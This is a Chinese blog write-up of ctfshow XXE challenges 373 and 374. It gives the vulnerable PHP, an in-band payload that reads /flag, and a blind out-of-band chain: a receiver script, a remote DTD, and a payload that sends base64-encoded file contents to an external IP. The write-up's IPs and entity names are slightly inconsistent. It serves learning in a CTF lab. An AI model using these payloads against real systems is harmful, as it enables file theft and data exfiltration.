class="comment">//è·å–ctfshowèŠ‚ç‚¹çš„å€¼</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>åˆ†æä¸‹æ¥å°±æ˜¯ï¼Œè¿™ä¸ªä»£ç å®ç°äº†è¯»å–xmlå­—ç¬¦ä¸²å¹¶å°†å…¶è½¬åŒ–ä¸ºSimpleXMLå¯¹è±¡ï¼Œé€šè¿‡è®¿é—®å¯¹è±¡å†…å±æ€§å®ç°æå–</p>
<p>ç¬¬ä¸€é¢˜ï¼Œå½“ç„¶æ˜¯æŠ„çš„payload:</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">        &lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">å®šä¹‰äº†ä¸€ä¸ªå¤–éƒ¨å®ä½“ flagï¼Œå®ƒæŒ‡å‘ /flag æ–‡ä»¶ã€‚</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;ctfshow&gt;&amp;flag;&lt;/ctfshow&gt;</span><br><span class="line">å†…éƒ¨å¼•ç”¨flagè¯»å–/flag</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h3 id="2-374å…³-æ— å›æ˜¾"><a href="#2-374å…³-æ— å›æ˜¾" class="headerlink" title="2.374å…³ æ— å›æ˜¾"></a>2.374å…³ æ— å›æ˜¾</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™ä¸ªé¢˜ç›®çš„ç‰¹å¾å°±æ˜¯æ²¡æœ‰è¾“å‡ºè¯­å¥ï¼Œæ‰€ä»¥è¿™éœ€è¦æˆ‘ä»¬åˆ©ç”¨å…¶åŠ è½½å¤–éƒ¨æ–‡ä»¶çš„ç‰¹æ€§å»å°†è¯»å–å†…å®¹å¤–å¸¦åˆ°äº‘æœåŠ¡å™¨ä¸Š</p>
<p>é¦–å…ˆæˆ‘ä»¬å…ˆå†™ä¸€ä¸ªXXE.phpå»è·å–flag</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="comment">//é€šè¿‡GETè¯·æ±‚æ¥æ‹¿åˆ°flagå¹¶å‚¨å­˜åˆ°æ–‡ä»¶å½“ä¸­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;æ›´æ–°æ—¶é—´:&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>).<span class="string">&quot;\n&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no data input&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ç„¶åæˆ‘ä»¬éœ€è¦å†å†™ä¸€ä¸ªXXE.dtdå»å‘é€flagåˆ°XXE.php</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://118.31.168.4:1994/XXE.php?data=%data;&#x27;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>äº‘æœåŠ¡å™¨éƒ¨ç½²å¥½ä»¥åæˆ‘ä»¬è¿˜éœ€è¦ï¼Œè®©ç›®æ ‡æœåŠ¡å™¨å»è¯»å–æˆ‘ä»¬çš„XXE.dtdæ–‡ä»¶</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">        &lt;!ELEMENT root ANY &gt;</span><br><span class="line">        &lt;!ENTITY % data SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % dtd SYSTEM &quot;http://118.168.31.4:1994/XXE.php&quot;&gt;</span><br><span class="line">        %dtd;</span><br><span class="line">        %send;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;root&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>% fileé€šè¿‡phpä¼ªåè®®å»æ‹¿åˆ°&#x2F;flagï¼Œå†é€šè¿‡è®¿é—®% aaaå»åŒ…å«XXE.dtdã€‚åŒ…å«äº†ä¹‹åXXE.dtdå†é€šè¿‡urlä¼ é€’&#x2F;flag</p>
</div><div class="post-reward"><div class="post-reward-btn" title="Reward The Author"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">Credits</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">This work is published by John Doe at 2025-03-27 19:11:19</div><div class="post-copyright-link"><span>Link: <a href="http://example.com/2025/03/27/XXE/">XXE</a></span><button class="copy-text" type="button" data-text="http://example.com/2025/03/27/XXE/">Copy</button></div><div class="post-copyright-detail">This work is licensed under <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a>. Please indicate <a href='/'>Meiçš„å°çª</a> when reprinting.</div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>Table Of Content</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-list-text">XXEå­¦ä¹ ç¬”è®°</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-list-text">å‰è¨€</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#1-XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-list-text">1.XXEæ¼æ´åŸç†</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#2-XXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-list-text">2.XXEæ¼æ´åˆ©ç”¨</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-list-text">1.æ–‡ä»¶è¯»å–</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#3-ctfshow"><span class="toc-list-text">3.ctfshow</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-373%E5%85%B3-%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-list-text">1.373å…³  æœ‰å›æ˜¾</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-374%E5%85%B3-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-list-text">2.374å…³ æ— å›æ˜¾</span></a></li></ol></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="Dark Mode" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="Share" type="button" data-text="http://example.com/2025/03/27/XXE/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="Increase Font Size" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="Decrease Font Size" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="Settings" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="Table Of Content" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="Go To Top" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div></main><footer><div class="footer"><div id="footer-copyright">Â© 2024 - 2025 <span>ğŸ’—</span> <a href="/null">John Doe</a></div><div id="footer-info"><div id="footer-framework">ğŸš€Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a></div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">ğŸŒ»Blog Runtime: . Years . Months . Days</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
  root: '/',
  toolbar: true,
  lazyload_src: '/assets/images/Meow-Loading.webp',
  friends: false,
  codeblock: true,
  share_text: 'ğŸ±Share From Meow',
  onblur_title: 'Please Come Backï½âœ§(Â´â–½`Êƒâ™¡Æª)',
  mouse_click: false,
  notify:{
    enable: false,
    info: 'Copied successfully! Please mark the address of this post if redistribute.',
    f12_info: 'Turned on developer mode, please follow the copyright license of this website'
  },
  search: {
    enable: false,
    path: '',
    local: {
      top_n_per_article: 1,
      preload: false
    }
  },
  encrypt: false,
};
</script><script>if (!localStorage.getItem('color-mode')) {
  localStorage.setItem('color-mode', 'light' || 'light');
}
document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
</script>
<script src="/js/theme/tools/utils.js"></script>

<script src="/js/plugins/dist/lazyload.min.js"></script>

<script src="/js/plugins/view-image.min.js"></script>
<script>if (localStorage.getItem('font-size')) {
  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
}
</script>
<script src="/js/main.js" type="module"></script>
</div></body></html>